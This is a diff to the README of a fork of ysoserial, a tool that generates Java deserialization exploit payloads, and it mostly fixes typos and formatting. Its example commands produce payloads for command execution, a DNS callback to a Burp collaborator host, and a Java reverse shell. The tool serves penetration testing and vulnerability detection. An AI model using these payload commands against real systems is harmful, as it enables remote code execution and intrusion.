@@ -17,11 +17,11 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 This is a fork of the official great ysoserial project with some improvements I added to create payloads for the Burp Suite plugin [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) and more generally to speed-up and improve the detection and the exploitation of Java serialization issues with ysoserial. 
 
-I will not execute a pull requests to the main plugin because some of my changes can't be applied to all the ysoserial plugin, because they require the execution of arbitrary Java code and many plugins execute other tasks (file upload, execution of EL espressions, ...). In these situations, obviously, the modified version can execute the original ysoserial payload (all original features should work correctly). 
+I will not execute a pull request to the main plugin because some of my changes can't be applied to all the ysoserial plugin, because they require the execution of arbitrary Java code and many plugins execute other tasks (file upload, execution of EL expressions, ...). In these situations, obviously, the modified version can execute the original ysoserial payload (all original features should work correctly). 
 
 I will try to update periodically this fork, in order to maintain it updated with ysoserial codebase. The fork should be fully compatible with tools that require ysoserial because if the arguments I added are not supplied, the tool should default to ysoserial original behavior.
 
-Same ysoserial disclaimer applies here and I don't guarantee at all the absence of bugs in this fork! Use it at your own risk and if you doubt on some behaviors try also with the original ysoserial. This is a quick-and-dirty modifications and all the "test" features of ysoserial have not been tested! :)
+Same ysoserial disclaimer applies here and I don't guarantee at all the absence of bugs in this fork! Use it at your own risk and if you doubt on some behaviors try also with the original ysoserial. This is a quick-and-dirty modification and all the "test" features of ysoserial have not been tested! :)
 
 **ysoserial improvements:**
 
@@ -35,11 +35,11 @@ Check next *Usage* sub-chapter for details.
 
 This is ysoserial default usage:
 
-java -jar ysoserial-[version]-all.jar [payload] '[command]'
+    java -jar ysoserial-[version]-all.jar [payload] '[command]'
 
 This is the usage of my fork:
 
-java -jar ysoserial-fd-[version].jar [payload] '[command]' **[attack_type] [payload_transformations]**
+    java -jar ysoserial-fd-[version].jar [payload] '[command]' [attack_type] [payload_transformations]
 
 The two added arguments are optional. Without supplying them, it default to ysoserial original behaviour.
 
@@ -66,21 +66,26 @@ Multiple transformations can be supplied comma-separated. An example is *base64,
 
 ### Examples
 
-// Generate a CommonsCollections1 payload to execute commands on Windows and encode it in base64+URL
-java -jar ysoserial-fd-0.0.6.jar CommonsCollections1 "echo AAA > a.txt" exec_win base64,url_encoding
+\# To generate a CommonsCollections1 payload that executes commands on Windows and encode it in base64+URL:
 
-// Generate a Jdk7u21 payload to execute a sleep of 10 seconds and output it in XML using XStream
-java -jar ysoserial-fd-0.0.6.jar Jdk7u21 10000 sleep xstream
+    java -jar ysoserial-fd-0.0.6.jar CommonsCollections1 "echo AAA > a.txt" exec_win base64,url_encoding
 
-// Generate a DNS resolution payload to a collaborator URL and encode it with gzip+ASCII-HEX
-java -jar ysoserial-fd-0.0.6.jar Spring1 "yourcollaboratorpayload.burpcollaborator.net" dns gzip,ascii_hex
+\# To generate a Jdk7u21 payload that executes a sleep of 10 seconds and output it in XML using XStream:
 
-// Generate a pure Java reverse shell and output in plain binary
-java -jar ysoserial-fd-0.0.6.jar CommonsCollections2 "127.0.0.1:8888" reverse_shell
+    java -jar ysoserial-fd-0.0.6.jar Jdk7u21 10000 sleep xstream
 
-// Generate a payload using ysoserial default (the two commands are the same):
-java -jar ysoserial-fd-0.0.6.jar ROME "calc.exe"
-java -jar ysoserial-fd-0.0.6.jar ROME "calc.exe" exec_global
+\# To generate a DNS resolution payload with a collaborator URL, encoding it with gzip+ASCII-HEX:
+
+    java -jar ysoserial-fd-0.0.6.jar Spring1 "yourcollaboratorpayload.burpcollaborator.net" dns gzip,ascii_hex
+
+\# To generate a pure Java reverse shell, output in plain binary:
+
+    java -jar ysoserial-fd-0.0.6.jar CommonsCollections2 "127.0.0.1:8888" reverse_shell
+
+\# To generate a payload using ysoserial default (the two commands are the same, exec_global is the default):
+
+    java -jar ysoserial-fd-0.0.6.jar ROME "calc.exe"
+    java -jar ysoserial-fd-0.0.6.jar ROME "calc.exe" exec_global
 
 
 ## Description
